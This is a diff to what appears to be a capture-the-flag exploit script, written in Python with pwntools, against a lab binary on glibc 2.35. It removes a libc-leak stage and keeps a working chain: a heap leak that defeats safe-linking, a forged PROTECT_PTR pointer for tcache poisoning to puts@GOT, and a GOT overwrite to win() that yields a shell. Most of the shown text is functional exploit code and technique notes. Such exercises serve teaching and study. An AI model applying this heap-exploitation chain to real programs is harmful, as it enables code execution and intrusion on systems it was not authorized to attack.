@@ -5,7 +5,7 @@ C4 (stretch) - safe-linking (PROTECT_PTR) bypass on glibc 2.35
 ==============================================================
 Target  : ./heapnote_235  (glibc 2.35, -no-pie, partial RELRO)
 Goal    : defeat safe-linking to perform tcache poisoning on 2.35.
-Leak    : unsorted bin libc leak (as in C2) + a 3-nibble heap leak.
+Leak    : heap-page leak via a singly-freed tcache chunk (defeats safe-linking).
 
 What changed on 2.32+
 ---------------------
@@ -44,10 +44,8 @@ BUT this binary is -no-pie + partial RELRO (writable GOT), so the C1
 finisher -- GOT overwrite -- still works on 2.35 once we have the
 safe-linking bypass. We chain:
 
-    1. unsorted-bin libc leak              (same as C2)
-    2. heap-page leak via a singly-freed    (defeats safe-linking)
-       tcache chunk
-    3. forge fd = PROTECT_PTR(&fd,puts@GOT) -> tcache returns puts@GOT
+    1. heap-page leak via a singly-freed tcache chunk (defeats safe-linking)
+    2. forge fd = PROTECT_PTR(&fd,puts@GOT) -> tcache returns puts@GOT
        -> write &win there -> next menu() puts() -> win() -> shell
 
 One 2.34+ subtlety: tcache_get() writes `e->key = 0` at returned_ptr+8, so
@@ -77,7 +75,6 @@ import sys
 DEMO = "--demo" in sys.argv
 
 context.binary = exe = ELF("./heapnote_235")
-libc = ELF("./glibc-2.35/libc-2.35.so")
 context.log_level = "info"
 
 p = process("./heapnote_235")
@@ -123,28 +120,7 @@ def protect_ptr(fd_slot_addr: int, target: int) -> int:
     return (fd_slot_addr >> 12) ^ target
 
 # ===========================================================================
-# STAGE 1 - libc leak via unsorted bin (same mechanic as C2)
-# ===========================================================================
-BIG = 0x418
-add(0, BIG, b"A" * 8)
-add(1, 0x18, b"GUARD")
-delete(0)
-demo_hint("run: bins | 0x420 chunk in the unsorted bin")
-leak = u64(show(0)[:8].ljust(8, b"\x00"))
-# On 2.34+ __malloc_hook is a compat NO-OP symbol, not main_arena-0x10, so the
-# C2/C3 trick (main_arena = __malloc_hook+0x10) does NOT work here. Instead we
-# use the fixed offset of the unsorted-bin head -- the libc address a freed
-# unsorted chunk's fd points at -- relative to the libc base. For the pinned
-# 2.35-0ubuntu3.14 build this is 0x21ace0 (= main_arena + the unsorted-head
-# offset within main_arena). If you pin a different 2.35 sub-version, recompute
-# it: leak once, read the real libc base from /proc/<pid>/maps, and take the
-# difference (it must end in 0xce0 here; the page-aligned result is your check).
-UNSORTED_HEAD_OFF = 0x21ace0
-libc.address = leak - UNSORTED_HEAD_OFF
-log.success("libc base = %#x", libc.address)
-
-# ===========================================================================
-# STAGE 2 - heap-page leak via a singly-freed tcache chunk
+# STAGE 1 - heap-page leak via a singly-freed tcache chunk
 # ===========================================================================
 SZ = 0x68
 add(2, SZ, b"H" * 8)
@@ -163,7 +139,7 @@ delete(4)
 delete(3)                    # head=3 -> 4 -> (note 2), counts=3
 
 # ===========================================================================
-# STAGE 3 - forge fd -> puts@GOT, GOT overwrite -> win -> shell
+# STAGE 2 - forge fd -> puts@GOT, GOT overwrite -> win -> shell
 # ===========================================================================
 # 2.34+ tcache_get() zeroes returned_ptr+8 (e->key=0). puts@GOT's +8 neighbour
 # is write@GOT (only used by show(), never in the menu path), so it's safe;
